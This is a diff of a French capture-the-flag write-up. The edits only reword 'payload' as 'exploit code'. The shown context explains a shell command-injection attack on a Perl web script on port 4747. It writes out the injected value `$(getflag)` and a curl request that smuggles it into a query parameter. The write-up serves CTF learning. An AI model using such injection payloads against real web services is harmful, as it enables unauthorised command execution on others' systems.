@@ -55,7 +55,7 @@ La vulnérabilité est une injection de commande classique :
 ### 1. Identifier le service web
 Le commentaire `# localhost:4747` indique que le script fonctionne comme un serveur web sur le port 4747.
 
-### 2. Fabriquer une charge utile d'injection de commande
+### 2. Fabriquer un code d'exploitation d'injection de commande
 Puisque le script exécute des commandes shell avec l'entrée utilisateur, nous pouvons utiliser la syntaxe shell pour injecter nos propres commandes :
 ```bash
 $(getflag)
@@ -69,7 +69,7 @@ echo $(getflag) 2>&1
 La syntaxe `$()` indique au shell d'exécuter `getflag` et de substituer sa sortie.
 
 ### 3. Envoyer la requête d'exploitation
-Utilisation de `curl` pour envoyer la requête HTTP avec notre charge utile :
+Utilisation de `curl` pour envoyer la requête HTTP avec notre code d'exploitation :
 ```bash
 curl "http://localhost:4747/level04.pl?x=\$(getflag)"
 ```
